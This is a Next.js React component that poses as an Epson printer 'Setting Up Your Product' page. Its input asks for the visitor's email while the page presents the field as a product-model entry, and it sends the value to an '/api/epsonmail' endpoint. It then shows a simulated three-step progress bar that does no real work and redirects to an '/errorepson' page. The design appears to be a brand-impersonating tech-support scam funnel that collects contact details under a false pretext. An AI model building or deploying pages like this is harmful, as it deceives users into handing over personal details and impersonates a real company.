"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";


  const logo = "/images/EPSON-1.png";
  const hero = "/images/epsion-loader.png";

export default function EpsonPrinter() {
  const [EPmodel, setEpmodel] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const router = useRouter();

  const totalSteps = 3;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setStep(0);

    try {
      const res = await fetch("/api/epsonmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ EPmodel }),
      });

      const data = await res.json();

      if (data.success) {
        // Start step simulation
        let currentStep = 0;
        const interval = setInterval(() => {
          currentStep++;
          setStep(currentStep);
          if (currentStep >= totalSteps) {
            clearInterval(interval);
            setTimeout(() => router.push("/errorepson"), 500);
          }
        }, 1000);
      } else {
        alert("Failed to send email.");
        setLoading(false);
      }
    } catch (err) {
      console.error(err);
      alert("Error sending email.");
      setLoading(false);
    }
  };

  return (
    <>
      {!loading ? (
         <div
      className="h-screen bg-cover bg-center flex flex-col justify-center items-center"
      style={{ backgroundImage: "url('/images/jumbo_top.jpg')" }}
    >
      <h1 className="text-4xl md:text-5xl font-bold text-white mb-4 text-center">
        Setting Up Your Product
      </h1>
      <p className="text-white mb-6 text-center">
        Enter the name of your product or select it from all products. e.g. XP-225
      </p>
      <form onSubmit={handleSubmit} className="flex flex-col md:flex-row gap-4">
        <input
            type="text"
            placeholder="Enter your email"
            value={EPmodel}
            onChange={(e) => setEpmodel(e.target.value)}
            required
            style={{ padding: "10px", width: "100%", marginBottom: "10px" }}
          />
        <button
          type="submit"
          className="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700 transition"
        >
          GO
        </button>
      </form>
    </div>
      ) : (
        

<>
<div className="loadinstepwrapper">
<div className="leftside">

  <Image
        src={logo}
        alt="HP"
      width={99}
      height={24}
      priority
          className=" object-contain"
    />
</div>
<div className="mtside">
<div
          style={{
            minHeight: "70vh",
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <h3>Processing...</h3>

          {/* Progress Bar */}
          <div
            style={{
              width: "80%",
              maxWidth: 400,
              height: "12px",
              backgroundColor: "#e0e0e0",
              borderRadius: "8px",
              overflow: "hidden",
              margin: "20px 0",
            }}
          >
            <div
              style={{
                height: "100%",
                width: `${(step / totalSteps) * 100}%`,
                backgroundColor: "#4caf50",
                transition: "width 0.5s ease-in-out",
              }}
            />
          </div>

          <p>
            {step} of {totalSteps} steps completed
          </p>
        </div>
</div>
<div className="rightside">
                               <Image
                                     src={hero}
                                     alt="Product"
                                  width={708}
                                height={395}
                                    priority
                                       className=" object-contain"
                                  />
</div>
</div>
</>



      )}
    </>
  );
}
